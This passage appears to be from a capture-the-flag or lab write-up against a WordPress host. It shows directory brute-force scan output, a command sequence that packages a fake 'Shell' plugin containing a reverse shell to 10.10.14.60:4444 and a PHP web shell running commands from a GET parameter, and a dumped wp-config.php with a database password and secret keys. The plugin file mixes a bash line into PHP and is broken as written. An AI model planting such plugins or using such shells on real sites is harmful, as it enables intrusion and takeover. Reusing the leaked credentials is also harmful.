wp-includes/js/tinymce/plugins/inlinepopups/skins/ (Status: 200) [Size: 34914]
wp-includes/js/tinymce/plugins/inlinepopups/skins/clearlooks2/img/ (Status: 200) [Size: 34914]
wp-includes/js/tinymce/plugins/media/ (Status: 200) [Size: 1234]
wp-includes/js/tinymce/plugins/media/.php (Status: 403) [Size: 279]
wp-includes/js/tinymce/plugins/media/css/ (Status: 200) [Size: 34914]
wp-includes/js/tinymce/plugins/inlinepopups/skins/clearlooks2/ (Status: 200) [Size: 34914]
wp-includes/js/tinymce/plugins/paste/ (Status: 200) [Size: 1234]
wp-includes/js/tinymce/plugins/paste/.php (Status: 403) [Size: 279]
wp-includes/js/tinymce/plugins/media/js/ (Status: 200) [Size: 34914]
wp-includes/js/tinymce/plugins/paste/js/ (Status: 200) [Size: 34914]
wp-includes/js/tinymce/plugins/spellchecker/ (Status: 200) [Size: 34914]
wp-includes/js/tinymce/plugins/safari/ (Status: 200) [Size: 34914]
wp-includes/js/tinymce/plugins/spellchecker/classes/ (Status: 200) [Size: 34914]
wp-includes/js/tinymce/plugins/spellchecker/css/ (Status: 200) [Size: 34914]
wp-includes/js/tinymce/plugins/spellchecker/classes/utils/ (Status: 200) [Size: 34914]
wp-includes/js/tinymce/plugins/spellchecker/includes/ (Status: 200) [Size: 34914]
wp-includes/js/tinymce/plugins/wordpress/.php (Status: 403) [Size: 279]
wp-includes/js/tinymce/plugins/tabfocus/.php (Status: 403) [Size: 279]
wp-includes/js/tinymce/plugins/spellchecker/img/ (Status: 200) [Size: 34914]
wp-includes/js/tinymce/plugins/tabfocus/ (Status: 200) [Size: 1240]
wp-includes/js/tinymce/plugins/wordpress/ (Status: 200) [Size: 1242]
wp-includes/js/tinymce/plugins/wordpress/img/ (Status: 200) [Size: 34914]
wp-includes/js/tinymce/plugins/wpdialogs/ (Status: 200) [Size: 1242]
wp-includes/js/tinymce/plugins/wpdialogs/.php (Status: 403) [Size: 279]
wp-includes/js/tinymce/plugins/wpeditimage/.php (Status: 403) [Size: 279]
wp-includes/js/tinymce/plugins/wpeditimage/ (Status: 200) [Size: 1246]
wp-includes/js/tinymce/plugins/wpeditimage/css/ (Status: 200) [Size: 34914]
wp-includes/js/tinymce/plugins/wpdialogs/js/ (Status: 200) [Size: 34914]
wp-includes/js/tinymce/plugins/wpeditimage/img/ (Status: 200) [Size: 34914]
wp-includes/js/tinymce/plugins/wpeditimage/js/ (Status: 200) [Size: 34914]
wp-includes/js/tinymce/plugins/wpgallery/ (Status: 200) [Size: 1242]
wp-includes/js/tinymce/plugins/wpgallery/.php (Status: 403) [Size: 279]
wp-includes/js/tinymce/plugins/wpfullscreen/css/ (Status: 200) [Size: 34914]
wp-includes/js/tinymce/plugins/wpfullscreen/ (Status: 200) [Size: 34914]
wp-includes/js/tinymce/plugins/wphelp/ (Status: 200) [Size: 34914]
wp-includes/js/tinymce/plugins/wpview/ (Status: 200) [Size: 1236]
wp-includes/js/tinymce/plugins/wplink/ (Status: 200) [Size: 1236]
wp-includes/js/tinymce/plugins/wpview/.php (Status: 403) [Size: 279]
wp-includes/js/tinymce/plugins/wplink/.php (Status: 403) [Size: 279]
wp-includes/js/tinymce/themes/ (Status: 200) [Size: 1200]
wp-includes/js/tinymce/plugins/wpgallery/img/ (Status: 200) [Size: 34914]
wp-includes/js/tinymce/themes/.php (Status: 403) [Size: 279]
wp-includes/js/tinymce/themes/advanced/ (Status: 200) [Size: 34914]
wp-includes/js/tinymce/themes/advanced/img/ (Status: 200) [Size: 34914]
wp-includes/js/tinymce/themes/advanced/js/ (Status: 200) [Size: 34914]
wp-includes/js/tinymce/themes/advanced/skins/ (Status: 200) [Size: 34914]
wp-includes/js/tinymce/themes/advanced/skins/highcontrast/ (Status: 200) [Size: 34914]
wp-includes/js/tinymce/themes/advanced/skins/default/ (Status: 200) [Size: 34914]
wp-includes/js/tinymce/themes/advanced/skins/default/img/ (Status: 200) [Size: 34914]
wp-includes/js/tinymce/themes/advanced/skins/o2k7/img/ (Status: 200) [Size: 34914]
wp-includes/js/tinymce/themes/advanced/skins/wp_theme/img/ (Status: 200) [Size: 34914]
wp-includes/js/tinymce/utils/.php (Status: 403) [Size: 279]
wp-includes/js/tinymce/utils/ (Status: 200) [Size: 1626]
wp-includes/js/tinymce/utils/editable_selects.js (Status: 200) [Size: 2125]
wp-includes/js/tinymce/themes/advanced/skins/wp_theme/ (Status: 200) [Size: 34914]
wp-includes/js/tinymce/themes/advanced/skins/o2k7/ (Status: 200) [Size: 34914]
wp-includes/js/tinymce/tiny_mce_popup.js (Status: 200) [Size: 15988]
wp-includes/js/tinymce/utils/form_utils.js (Status: 200) [Size: 6075]
wp-includes/js/tinymce/utils/validate.js (Status: 200) [Size: 6466]
wp-includes/js/tinymce/utils/mctabs.js (Status: 200) [Size: 4160]
wp-includes/js/underscore.min.js (Status: 200) [Size: 19012]
wp-includes/js/utils.js (Status: 200) [Size: 4665]
wp-includes/js/tw-sack.js (Status: 200) [Size: 4970]
wp-includes/js/utils.min.js (Status: 200) [Size: 1864]
wp-includes/js/tw-sack.min.js (Status: 200) [Size: 3288]
wp-includes/js/wp-ajax-response.js (Status: 200) [Size: 3903]
wp-includes/js/wp-ajax-response.min.js (Status: 200) [Size: 2571]
wp-includes/js/wp-auth-check.js (Status: 200) [Size: 4444]
wp-includes/js/wp-auth-check.min.js (Status: 200) [Size: 1689]
wp-includes/js/wp-backbone.min.js (Status: 200) [Size: 3039]
wp-includes/js/wp-backbone.js (Status: 200) [Size: 15241]
wp-includes/js/wp-list-revisions.js (Status: 200) [Size: 970]
wp-includes/js/wp-list-revisions.min.js (Status: 200) [Size: 597]
wp-includes/js/wp-lists.min.js (Status: 200) [Size: 7521]
wp-includes/js/wp-pointer.js (Status: 200) [Size: 10233]
wp-includes/js/wp-lists.js (Status: 200) [Size: 25315]
wp-includes/js/wp-pointer.min.js (Status: 200) [Size: 3621]
wp-includes/js/wp-util.min.js (Status: 200) [Size: 1431]
wp-includes/js/wplink.min.js (Status: 200) [Size: 11317]
wp-includes/js/wplink.js (Status: 200) [Size: 21240]
wp-includes/js/wp-util.js (Status: 200) [Size: 4689]
wp-includes/ms-files.php (Status: 200) [Size: 29]
wp-includes/ms-blogs.php (Status: 200) [Size: 2]
wp-includes/media.php (Status: 200) [Size: 2]
wp-includes/ms-settings.php (Status: 200) [Size: 2]
wp-includes/nav-menu-template.php (Status: 200) [Size: 2]
wp-includes/js/tinymce/wp-tinymce.php (Status: 200) [Size: 369699]
wp-includes/pomo/.php (Status: 403) [Size: 279]
wp-includes/pomo/    (Status: 200) [Size: 1989]
wp-includes/SimplePie/ (Status: 200) [Size: 1378]
wp-includes/SimplePie/.php (Status: 403) [Size: 279]
wp-includes/SimplePie/Cache/ (Status: 200) [Size: 34914]
wp-includes/SimplePie/Content/ (Status: 200) [Size: 34914]
wp-includes/SimplePie/Decode/ (Status: 200) [Size: 34914]
wp-includes/SimplePie/Decode/HTML/ (Status: 200) [Size: 34914]
wp-includes/SimplePie/Content/Type/ (Status: 200) [Size: 34914]
wp-includes/SimplePie/HTTP/ (Status: 200) [Size: 34914]
wp-includes/SimplePie/Parse/ (Status: 200) [Size: 34914]
wp-includes/SimplePie/Net/ (Status: 200) [Size: 34914]
wp-includes/SimplePie/XML/Declaration/ (Status: 200) [Size: 34914]
wp-includes/Text/.php (Status: 403) [Size: 279]
wp-includes/Text/    (Status: 200) [Size: 1369]
wp-includes/SimplePie/XML/ (Status: 200) [Size: 34914]
wp-includes/Text/Diff/ (Status: 200) [Size: 1387]
wp-includes/Text/Diff/Renderer/ (Status: 200) [Size: 1014]
wp-includes/Text/Diff/Renderer/.php (Status: 403) [Size: 279]
wp-includes/Text/Diff/Engine/ (Status: 200) [Size: 1609]
wp-includes/Text/Diff/Engine/.php (Status: 403) [Size: 279]
wp-includes/Text/Diff/.php (Status: 403) [Size: 279]
wp-includes/theme-compat/ (Status: 200) [Size: 2648]
wp-includes/theme-compat/.php (Status: 403) [Size: 279]
wp-includes/vars.php (Status: 200) [Size: 2]
wp-includes/update.php (Status: 200) [Size: 2]
wp-includes/wp-diff.php (Status: 200) [Size: 2]
wp-mail.php          (Status: 403) [Size: 2548]
wp-json/             (Status: 200) [Size: 34914]
wp-login.php         (Status: 200) [Size: 4640]
wp-links-opml.php    (Status: 200) [Size: 223]
wp-trackback.php     (Status: 200) [Size: 135]
xmlrpc.php           (Status: 405) [Size: 42]
Progress: 7890 / 7890 (100.00%)
===============================================================
Finished



```


```
mkdir /tmp/shell
cat > /tmp/shell/shell.php << 'EOF'
<?php
/**
 * Plugin Name: Shell
 * Version: 1.0
 */
 sh -i >& /dev/tcp/10.10.14.60/4444 0>&1
system($_GET['cmd']);
EOF
cd /tmp && zip -r shell.zip shell/
```


```
<?php // SQLite database configuration define( 'DB_DIR', __DIR__ . '/wp-content/database/' ); define( 'DB_FILE', '.ht.sqlite' ); // Dummy MySQL settings (required but not used with SQLite) define( 'DB_NAME', 'wordpress' ); define( 'DB_USER', 'walter' ); define( 'DB_PASSWORD', 'JbhHDAEgXvri3!' ); define( 'DB_HOST', 'localhost' ); define( 'DB_CHARSET', 'utf8' ); define( 'DB_COLLATE', '' ); $table_prefix = 'wp_'; define( 'WP_DEBUG', false ); define('AUTH_KEY', '%88$_8C0xYR s^9jz;F epY,CO|+Up#ZFIdRS&Gqd~5O/|<^7DmLtEm=SjV|jmWZ'); define('SECURE_AUTH_KEY', 'BD-p*m6hvWAGGBDg%_UC,|>};`C2<1uK>*x!h.Wf*dE;lbhaQVbHw+uc@6OfH>B%'); define('LOGGED_IN_KEY', ';2fn^sP8F`HK0g,8C&2ar})EifGz@,5Z1{IoDD+CzOT@3w[g~*aM-+=zWcxGBYk2'); define('NONCE_KEY', 's>>f8%soM5P=D$J9UXV-kF]lKZ92.KF%FDS#+! ;(A|C9kMWT(=A>99->-$$>UvU'); define('AUTH_SALT', 'V 0X(1n-@p&})rQpQB_mEax]D9Z*;iM+23&b]!53._;,).:Lj?1ky56*Vaa~KF(B'); define('SECURE_AUTH_SALT', '-{[x4pgl %S5{_s}nE!%H8,05AO_699M4_[mLt^tVC$Kh4;s|n8~O<CSE4#uPWN.'); define('LOGGED_IN_SALT', 'wUxZI^1#)4o)C1KJ8a5o-k{V3L)agi|fofV0SzuSUI;1k%1 !9Q!P@-*j8Y_j%$;'); define('NONCE_SALT', 'j #rMhd[olj2$j8|QAF7L8rR-D kf&gs,:oX4py6x?6V3|oJ?[b~h,[~3uhH.|X%'); if ( ! defined( 'ABSPATH' ) ) { define( 'ABSPATH', __DIR__ . '/' ); } define( 'WP_SQLITE_PLUGIN', true ); require_once ABSPATH . 'wp-settings.php';
```


